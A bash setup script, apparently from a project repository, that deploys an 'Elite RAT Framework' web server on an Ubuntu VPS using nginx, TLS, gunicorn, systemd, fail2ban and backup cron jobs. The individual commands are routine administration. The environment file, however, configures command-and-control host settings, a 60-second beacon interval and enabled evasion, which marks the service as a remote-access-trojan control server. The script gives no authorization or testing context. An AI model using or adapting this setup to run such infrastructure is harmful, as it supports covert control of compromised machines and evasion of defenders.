#!/bin/bash
################################################################################
# QUICK DEPLOYMENT SCRIPT FOR UBUNTU VPS (IONOS)
# Elite RAT Framework - Complete Setup Commands
#
# USAGE: Run commands step by step (don't run entire script at once)
# Copy and paste each section as you go
################################################################################

# ============================================================================
# SECTION 1: INITIAL SETUP
# ============================================================================

# Connect to VPS (replace YOUR_VPS_IP)
# ssh root@YOUR_VPS_IP

# Update system
sudo apt update && sudo apt upgrade -y

# Install essential tools
sudo apt install -y build-essential wget curl git vim ufw fail2ban python3 python3-pip python3-venv python3-dev

# ============================================================================
# SECTION 2: SECURITY SETUP
# ============================================================================

# Create non-root user (replace 'eliteuser' with your username)
sudo adduser eliteuser
sudo usermod -aG sudo eliteuser

# Configure firewall
sudo ufw allow 22/tcp     # SSH
sudo ufw allow 80/tcp     # HTTP
sudo ufw allow 443/tcp    # HTTPS
sudo ufw allow 5000/tcp   # App (remove after nginx setup)
sudo ufw enable
sudo ufw status verbose

# ============================================================================
# SECTION 3: INSTALL DEPENDENCIES
# ============================================================================

# Install Python dependencies
sudo apt install -y libpq-dev libjpeg-dev zlib1g-dev libffi-dev libssl-dev libsqlite3-dev

# Install Node.js (optional)
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt install -y nodejs

# Install Nginx
sudo apt install -y nginx

# Install Certbot for SSL
sudo apt install -y certbot python3-certbot-nginx

# ============================================================================
# SECTION 4: SETUP GIT & CLONE REPOSITORY
# ============================================================================

# Generate SSH key for GitHub
ssh-keygen -t ed25519 -C "your_email@example.com"
eval "$(ssh-agent -s)"
ssh-add ~/.ssh/id_ed25519

# Display public key (add this to GitHub)
cat ~/.ssh/id_ed25519.pub

# Create application directory
sudo mkdir -p /opt/elite-rat
sudo chown -R $USER:$USER /opt/elite-rat
cd /opt/elite-rat

# Clone repository (REPLACE WITH YOUR REPO URL)
git clone git@github.com:YOUR_USERNAME/YOUR_REPO_NAME.git .

# ============================================================================
# SECTION 5: PYTHON VIRTUAL ENVIRONMENT & DEPENDENCIES
# ============================================================================

# Create and activate virtual environment
cd /opt/elite-rat
python3 -m venv venv
source venv/bin/activate

# Install dependencies
pip install --upgrade pip setuptools wheel
pip install -r requirements.txt
pip install gunicorn python-dotenv gevent gevent-websocket

# ============================================================================
# SECTION 6: CONFIGURE APPLICATION
# ============================================================================

# Create necessary directories
mkdir -p /opt/elite-rat/data
mkdir -p /opt/elite-rat/logs
mkdir -p /opt/elite-rat/keys
mkdir -p /opt/elite-rat/generated
mkdir -p /opt/elite-rat/ssl

# Create .env file
cat > /opt/elite-rat/.env << 'EOF'
# Server Configuration
FLASK_APP=web_app_real.py
FLASK_ENV=production
FLASK_DEBUG=false

# C2 Configuration
ELITE_C2_HOST=your-domain.com
ELITE_C2_PORT=443
ELITE_C2_PROTOCOL=https

# Security Credentials (CHANGE THESE!)
STITCH_ADMIN_USER=admin
STITCH_ADMIN_PASSWORD=CHANGE_THIS_PASSWORD_NOW
STITCH_SECRET_KEY=GENERATE_WITH_openssl_rand_hex_32

# Encryption Key
ELITE_ENCRYPTION_KEY=GENERATE_WITH_openssl_rand_hex_32

# Database
DATABASE_PATH=/opt/elite-rat/data/elite.db

# Optional Settings
ELITE_BEACON_INTERVAL=60
ELITE_ENABLE_EVASION=true
EOF

# Generate secure keys
echo "Generated Secret Key: $(openssl rand -hex 32)"
echo "Generated Encryption Key: $(openssl rand -hex 32)"
# IMPORTANT: Update .env file with these keys!

# Edit .env to add the generated keys
nano /opt/elite-rat/.env

# ============================================================================
# SECTION 7: SSL CERTIFICATE
# ============================================================================

# Option A: Let's Encrypt (recommended for production)
# REPLACE your-domain.com with your actual domain
sudo certbot certonly --standalone -d your-domain.com -d www.your-domain.com

# Option B: Self-signed certificate (for testing)
sudo openssl req -x509 -nodes -days 365 -newkey rsa:4096 \
    -keyout /opt/elite-rat/ssl/key.pem \
    -out /opt/elite-rat/ssl/cert.pem \
    -subj "/C=US/ST=State/L=City/O=Organization/CN=your-domain.com"

sudo chown -R $USER:$USER /opt/elite-rat/ssl
chmod 600 /opt/elite-rat/ssl/key.pem
chmod 644 /opt/elite-rat/ssl/cert.pem

# ============================================================================
# SECTION 8: CONFIGURE NGINX
# ============================================================================

# Create Nginx configuration
sudo tee /etc/nginx/sites-available/elite-rat > /dev/null << 'EOF'
upstream flask_app {
    server 127.0.0.1:5000;
}

server {
    listen 80;
    listen [::]:80;
    server_name your-domain.com www.your-domain.com;
    return 301 https://$server_name$request_uri;
}

server {
    listen 443 ssl http2;
    listen [::]:443 ssl http2;
    server_name your-domain.com www.your-domain.com;

    # SSL Configuration (Choose one)
    # For Let's Encrypt:
    ssl_certificate /etc/letsencrypt/live/your-domain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/your-domain.com/privkey.pem;
    
    # For self-signed:
    # ssl_certificate /opt/elite-rat/ssl/cert.pem;
    # ssl_certificate_key /opt/elite-rat/ssl/key.pem;

    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
    ssl_prefer_server_ciphers on;

    client_max_body_size 100M;

    location / {
        proxy_pass http://flask_app;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

    location /socket.io/ {
        proxy_pass http://flask_app/socket.io/;
        proxy_http_version 1.1;
        proxy_buffering off;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "Upgrade";
        proxy_set_header Host $host;
    }

    access_log /var/log/nginx/elite-rat-access.log;
    error_log /var/log/nginx/elite-rat-error.log;
}
EOF

# IMPORTANT: Edit the nginx config to update domain name
sudo nano /etc/nginx/sites-available/elite-rat

# Enable site
sudo ln -s /etc/nginx/sites-available/elite-rat /etc/nginx/sites-enabled/
sudo rm -f /etc/nginx/sites-enabled/default

# Test and restart Nginx
sudo nginx -t
sudo systemctl restart nginx
sudo systemctl enable nginx

# ============================================================================
# SECTION 9: CREATE SYSTEMD SERVICE
# ============================================================================

# Create systemd service
sudo tee /etc/systemd/system/elite-rat.service > /dev/null << 'EOF'
[Unit]
Description=Elite RAT Web Application
After=network.target

[Service]
Type=simple
User=eliteuser
Group=eliteuser
WorkingDirectory=/opt/elite-rat
Environment="PATH=/opt/elite-rat/venv/bin"
Environment="FLASK_ENV=production"
EnvironmentFile=/opt/elite-rat/.env

ExecStart=/opt/elite-rat/venv/bin/gunicorn \
    --bind 127.0.0.1:5000 \
    --workers 4 \
    --worker-class gevent \
    --timeout 300 \
    --access-logfile /opt/elite-rat/logs/access.log \
    --error-logfile /opt/elite-rat/logs/error.log \
    --log-level info \
    web_app_real:app

Restart=always
RestartSec=10
NoNewPrivileges=true
PrivateTmp=true

[Install]
WantedBy=multi-user.target
EOF

# IMPORTANT: Update User and Group in service file
sudo nano /etc/systemd/system/elite-rat.service

# Reload systemd and start service
sudo systemctl daemon-reload
sudo systemctl enable elite-rat
sudo systemctl start elite-rat

# Check status
sudo systemctl status elite-rat

# ============================================================================
# SECTION 10: CONFIGURE LOG ROTATION
# ============================================================================

sudo tee /etc/logrotate.d/elite-rat > /dev/null << 'EOF'
/opt/elite-rat/logs/*.log {
    daily
    missingok
    rotate 14
    compress
    delaycompress
    notifempty
    create 0640 eliteuser eliteuser
    sharedscripts
    postrotate
        systemctl reload elite-rat > /dev/null 2>&1 || true
    endscript
}
EOF

# ============================================================================
# SECTION 11: INSTALL MONITORING TOOLS
# ============================================================================

sudo apt install -y htop netdata
sudo systemctl enable netdata
sudo systemctl start netdata

# ============================================================================
# SECTION 12: SETUP FAIL2BAN FOR SSH PROTECTION
# ============================================================================

sudo apt install -y fail2ban
sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local

# Configure fail2ban
sudo tee -a /etc/fail2ban/jail.local > /dev/null << 'EOF'

[sshd]
enabled = true
port = 22
filter = sshd
logpath = /var/log/auth.log
maxretry = 3
bantime = 3600
EOF

sudo systemctl enable fail2ban
sudo systemctl start fail2ban

# ============================================================================
# SECTION 13: CREATE BACKUP SCRIPT
# ============================================================================

sudo mkdir -p /opt/backups

cat > /opt/elite-rat/backup.sh << 'EOF'
#!/bin/bash
BACKUP_DIR="/opt/backups"
DATE=$(date +%Y%m%d_%H%M%S)

mkdir -p $BACKUP_DIR
tar -czf $BACKUP_DIR/elite-rat-backup-$DATE.tar.gz \
    /opt/elite-rat/data \
    /opt/elite-rat/.env \
    /opt/elite-rat/config.yaml

ls -t $BACKUP_DIR/elite-rat-backup-*.tar.gz | tail -n +8 | xargs rm -f
echo "Backup complete: $BACKUP_DIR/elite-rat-backup-$DATE.tar.gz"
EOF

chmod +x /opt/elite-rat/backup.sh

# Add to crontab (runs daily at 2 AM)
(crontab -l 2>/dev/null; echo "0 2 * * * /opt/elite-rat/backup.sh") | crontab -

# ============================================================================
# SECTION 14: CREATE UPDATE SCRIPT
# ============================================================================

cat > /opt/elite-rat/update.sh << 'EOF'
#!/bin/bash
echo "Updating Elite RAT..."
cd /opt/elite-rat
git pull origin main
source venv/bin/activate
pip install -r requirements.txt --upgrade
sudo systemctl restart elite-rat
echo "Update complete!"
EOF

chmod +x /opt/elite-rat/update.sh

# ============================================================================
# VERIFICATION COMMANDS
# ============================================================================

# Check application status
sudo systemctl status elite-rat

# Check Nginx status
sudo systemctl status nginx

# Check if ports are listening
sudo netstat -tulpn | grep -E '(80|443|5000)'

# View application logs
sudo journalctl -u elite-rat -n 50

# View Nginx logs
sudo tail -f /var/log/nginx/elite-rat-error.log

# Test local connection
curl -I http://localhost:5000

# Test SSL connection (replace with your domain)
curl -I https://your-domain.com

# ============================================================================
# USEFUL COMMANDS FOR ONGOING MANAGEMENT
# ============================================================================

# Restart application
# sudo systemctl restart elite-rat

# View live logs
# sudo journalctl -u elite-rat -f

# Update from Git
# cd /opt/elite-rat && ./update.sh

# Manual backup
# /opt/elite-rat/backup.sh

# Check disk space
# df -h

# Check memory usage
# free -h

# Monitor processes
# htop

# View firewall rules
# sudo ufw status numbered

# Renew SSL certificate (Let's Encrypt)
# sudo certbot renew

################################################################################
# IMPORTANT NOTES:
################################################################################
# 1. Replace 'your-domain.com' with your actual domain throughout
# 2. Replace 'YOUR_VPS_IP' with your actual IONOS VPS IP
# 3. Replace 'YOUR_USERNAME/YOUR_REPO_NAME' with your GitHub repository
# 4. Replace 'eliteuser' with your actual username if different
# 5. Generate and update secure passwords and keys in .env file
# 6. Update DNS records in IONOS panel to point to your VPS IP
# 7. Configure IONOS Cloud Panel firewall rules in addition to UFW
#
# ACCESS YOUR APPLICATION:
# https://your-domain.com (or http://YOUR_VPS_IP:5000 for testing)
#
# DEFAULT LOGIN:
# Username: admin
# Password: (as set in .env file)
################################################################################

echo "Setup complete! Check the VPS_DEPLOYMENT_GUIDE.md for detailed instructions."
